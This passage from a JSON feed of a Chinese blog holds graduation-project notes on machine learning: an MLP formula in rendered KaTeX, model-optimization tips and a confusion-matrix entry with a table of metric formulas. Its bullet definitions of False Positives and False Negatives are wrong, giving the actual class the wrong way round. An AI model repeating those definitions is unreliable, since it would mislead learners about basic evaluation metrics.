style=\"margin-right:0.03588em;\">y</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0641em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">θ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-2.4519em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">10</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2481em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-2.4519em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2481em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0622em;vertical-align:-0.2481em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">θ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-2.4519em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">11</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2481em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-2.4519em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2481em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0622em;vertical-align:-0.2481em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">θ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-2.4519em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">12</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2481em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-2.4519em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2481em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0641em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">θ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-2.4519em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2481em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-2.4519em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2481em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1706767397/Typera/2024/02/ffb09cdb9b4d5d5d009ae40b555cb33d.png\" alt=\"image-20240201140306721\" /></p>\n<p>如上图，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">x_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.5806em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 为输入层，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msubsup><mi>a</mi><mi>i</mi><mn>2</mn></msubsup></mrow><annotation encoding=\"application/x-tex\">a_i^2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.0728em;vertical-align:-0.2587em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-2.4413em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2587em;\"><span></span></span></span></span></span></span></span></span></span> 为隐藏层，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>y</mi></mrow><annotation encoding=\"application/x-tex\">y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span></span></span> 为输出层，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>θ</mi><mi>j</mi></msup></mrow><annotation encoding=\"application/x-tex\">\\theta^j</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8247em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">θ</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8247em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span></span></span></span></span></span></span> 为权值系数；</p>\n<p><mark>共有 4 个模型，组合为最终的 MLP 模型</mark></p>\n<p>实际中，输出层也可以有多个输出结果。</p>\n",
            "tags": [
                "深度学习",
                "毕业设计",
                "机器学习"
            ]
        },
        {
            "id": "https://www.sycamore.top/Graduation/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%A8%A1%E5%9E%8B%E4%BC%98%E5%8C%96/",
            "url": "https://www.sycamore.top/Graduation/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%A8%A1%E5%9E%8B%E4%BC%98%E5%8C%96/",
            "title": "模型优化",
            "date_published": "2024-01-31T16:08:14.000Z",
            "content_html": "<h1 id=\"模型优化\"><a class=\"anchor\" href=\"#模型优化\">#</a> 模型优化</h1>\n<h2 id=\"数据\"><a class=\"anchor\" href=\"#数据\">#</a> 数据</h2>\n<blockquote>\n<p>数据的质量决定模型表现的上限</p>\n</blockquote>\n<p>检查：</p>\n<ol>\n<li>数据<strong>属性的意义</strong>，是否为无关数据 =&gt;<br />\n 删除不必要的属性 =&gt; 减少过拟合、节约运算时间</li>\n<li>不同属性数据的<strong>数量级</strong>差异性如何 =&gt;<br />\n 数据<strong>预处理</strong>：归一化、标准化 =&gt; 平衡数据影响，加快训练收敛</li>\n<li>是否有<strong>异常</strong>数据 =&gt;<br />\n 是否保留或过滤掉<strong>异常</strong>数据 =&gt; 提高鲁棒性</li>\n<li>数据样本<strong>数量</strong>是否足够 =&gt; 扩大数据样本</li>\n<li><strong>采集数据</strong>的方法是否合理，采集到的数据是否有代表性</li>\n<li>对于标签结果，要确保<strong>标签判定规则</strong>的一致性（统一标准）</li>\n</ol>\n<h2 id=\"不同的模型\"><a class=\"anchor\" href=\"#不同的模型\">#</a> 不同的模型</h2>\n<p>尝试不同的模型，对比模型表现 =&gt; 帮助确定更合适的模型</p>\n<h2 id=\"核心参数\"><a class=\"anchor\" href=\"#核心参数\">#</a> 核心参数</h2>\n<p><strong>遍历</strong>核心参数组合，评估模型表现</p>\n",
            "tags": [
                "毕业设计",
                "机器学习"
            ]
        },
        {
            "id": "https://www.sycamore.top/Graduation/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%B7%B7%E6%B7%86%E7%9F%A9%E9%98%B5/",
            "url": "https://www.sycamore.top/Graduation/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%B7%B7%E6%B7%86%E7%9F%A9%E9%98%B5/",
            "title": "混淆矩阵",
            "date_published": "2024-01-28T17:51:13.000Z",
            "content_html": "<h1 id=\"混淆矩阵\"><a class=\"anchor\" href=\"#混淆矩阵\">#</a> 混淆矩阵</h1>\n<blockquote>\n<p>使用<strong>准确率</strong>进行模型评估的<strong>局限性</strong>：<br />\n（以预测 0/1 数据为例，不用模型，直接预测结果全是 1 的准确率也可能很高）</p>\n</blockquote>\n<ul>\n<li>没有体现数据预测的<strong>实际分布情况</strong></li>\n<li>没有体现模型<strong>错误预测的类型</strong>。</li>\n</ul>\n<blockquote>\n<p><strong>混淆矩阵</strong>：又称误差矩阵，用于衡量分类算法的<strong>准确程度</strong></p>\n</blockquote>\n<ul>\n<li>True Positives (TP)：预测准确、实际为正样本的数量</li>\n<li>True Negatives (TN)：预测准确、实际为负样本的数量</li>\n<li>False Positives (FP)：预测错误、实际为正样本的数量</li>\n<li>False Negatives (FN)：预测错误、实际为负样本的数量</li>\n</ul>\n<blockquote>\n<p>更丰富的模型评估指标</p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">指标</th>\n<th style=\"text-align:center\">公式</th>\n<th style=\"text-align:center\">定义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">准确率（Accuracy）</td>\n<td style=\"text-align:center\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mfrac><mrow><mi>T</mi><mi>P</mi><mo>+</mo><mi>T</mi><mi>N</mi></mrow><mrow><mi>T</mi><mi>P</mi><mo>+</mo><mi>T</mi><mi>N</mi><mo>+</mo><mi>F</mi><mi>P</mi><mo>+</mo><mi>F</mi><mi>N</mi></mrow></mfrac></mrow><annotation encoding=\"application/x-tex\">\\frac{TP+TN}{TP+TN+FP+FN}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.2757em;vertical-align:-0.4033em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8723em;\"><span style=\"top:-2.655em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">TP</span><span class=\"mbin mtight\">+</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">TN</span><span class=\"mbin mtight\">+</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">FP</span><span class=\"mbin mtight\">+</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">FN</span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.394em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">TP</span><span class=\"mbin mtight\">+</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">TN</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.4033em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></td>\n<td style=\"text-align:center\">总样本中，预测正确的比例</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">错误率（Misclassification Rate）</td>\n<td style=\"text-align:center\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mfrac><mrow><mi>F</mi><mi>P</mi><mo>+</mo><mi>F</mi><mi>N</mi></mrow><mrow><mi>T</mi><mi>P</mi><mo>+</mo><mi>T</mi><mi>N</mi><mo>+</mo><mi>F</mi><mi>P</mi><mo>+</mo><mi>F</mi><mi>N</mi></mrow></mfrac></mrow><annotation encoding=\"application/x-tex\">\\frac{FP+FN}{TP+TN+FP+FN}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.2757em;vertical-align:-0.4033em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8723em;\"><span style=\"top:-2.655em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">TP</span><span class=\"mbin mtight\">+</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">TN</span><span class=\"mbin mtight\">+</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">FP</span><span class=\"mbin mtight\">+</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">FN</span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.394em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">FP</span><span class=\"mbin mtight\">+</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">FN</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.4033em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></td>\n<td style=\"text-align:center\">总样本中，预测错误的比例</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">召回率（Recall）</td>\n<td style=\"text-align:center\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mfrac><mrow><mi>T</mi><mi>P</mi></mrow><mrow><mi>T</mi><mi>P</mi><mo>+</mo><mi>F</mi><mi>N</mi></mrow></mfrac></mrow><annotation encoding=\"application/x-tex\">\\frac{TP}{TP+FN}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.2757em;vertical-align:-0.4033em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8723em;\"><span style=\"top:-2.655em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">TP</span><span class=\"mbin mtight\">+</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">FN</span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.394em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">TP</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.4033em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></td>\n<td style=\"text-align:center\">正样本中，预测正确的比例</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">特异度（Specificity）</td>\n<td style=\"text-align:center\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mfrac><mrow><mi>T</mi><mi>N</mi></mrow><mrow><mi>T</mi><mi>N</mi><mo>+</mo><mi>F</mi><mi>P</mi></mrow></mfrac></mrow><annotation encoding=\"application/x-tex\">\\frac{TN}{TN+FP}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.2757em;vertical-align:-0.4033em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8723em;\"><span style=\"top:-2.655em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">TN</span><span class=\"mbin mtight\">+</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">FP</span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.394em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">TN</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.4033em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></td>\n<td style=\"text-align:center\">负样本中，预测正确的比例</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">精确率（Precision）</td>\n<td style=\"text-align:center\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mfrac><mrow><mi>T</mi><mi>P</mi></mrow><mrow><mi>T</mi><mi>P</mi><mo>+</mo><mi>F</mi><mi>P</mi></mrow></mfrac></mrow><annotation encoding=\"application/x-tex\">\\frac{TP}{TP+FP}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.2757em;vertical-align:-0.4033em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8723em;\"><span style=\"top:-2.655em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">TP</span><span class=\"mbin mtight\">+</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">FP</span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.394em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">TP</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.4033em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></td>\n<td style=\"text-align:center\">预测结果为正的样本中，预测正确的比例</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">F1 分数（F1 Score）</td>\n<td style=\"text-align:center\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mfrac><mrow><mn>2</mn><mo>×</mo><mi>P</mi><mi>r</mi><mi>e</mi><mi>c</mi><mi>i</mi><mi>s</mi><mi>i</mi><mi>o</mi><mi>n</mi><mo>×</mo><mi>R</mi><mi>e</mi><mi>c</mi><mi>a</mi><mi>l</mi><mi>l</mi></mrow><mrow><mi>P</mi><mi>r</mi><mi>e</mi><mi>c</mi><mi>i</mi><mi>s</mi><mi>i</mi><mi>o</mi><mi>n</mi><mo>+</mo><mi>R</mi><mi>e</mi><mi>c</mi><mi>a</mi><mi>l</mi><mi>l</mi></mrow></mfrac></mrow><annotation encoding=\"application/x-tex\">\\frac{2\\times Precision\\times Recall}{Precision+Recall}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.2834em;vertical-align:-0.4033em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8801em;\"><span style=\"top:-2.655em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord mathnormal mtight\">rec</span><span class=\"mord mathnormal mtight\">i</span><span class=\"mord mathnormal mtight\">s</span><span class=\"mord mathnormal mtight\">i</span><span class=\"mord mathnormal mtight\">o</span><span class=\"mord mathnormal mtight\">n</span><span class=\"mbin mtight\">+</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal mtight\">ec</span><span class=\"mord mathnormal mtight\">a</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.01968em;\">ll</span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.394em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mbin mtight\">×</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord mathnormal mtight\">rec</span><span class=\"mord mathnormal mtight\">i</span><span class=\"mord mathnormal mtight\">s</span><span class=\"mord mathnormal mtight\">i</span><span class=\"mord mathnormal mtight\">o</span><span class=\"mord mathnormal mtight\">n</span><span class=\"mbin mtight\">×</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal mtight\">ec</span><span class=\"mord mathnormal mtight\">a</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.01968em;\">ll</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.4033em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></td>\n<td style=\"text-align:center\">综合 Precision 和 Recall 的指标</td>\n</tr>\n</tbody>\n</table>\n",
            "tags": [
                "毕业设计",
                "机器学习"
            ]
        },
        {
            "id": "https://www.sycamore.top/Graduation/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%85%B6%E4%BB%96%E5%B8%B8%E7%94%A8%E6%8A%80%E6%9C%AF/",
            "url": "https://www.sycamore.top/Graduation/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%85%B6%E4%BB%96%E5%B8%B8%E7%94%A8%E6%8A%80%E6%9C%AF/",
            "title": "其他常用技术",
            "date_published": "2024-01-25T18:14:36.000Z",
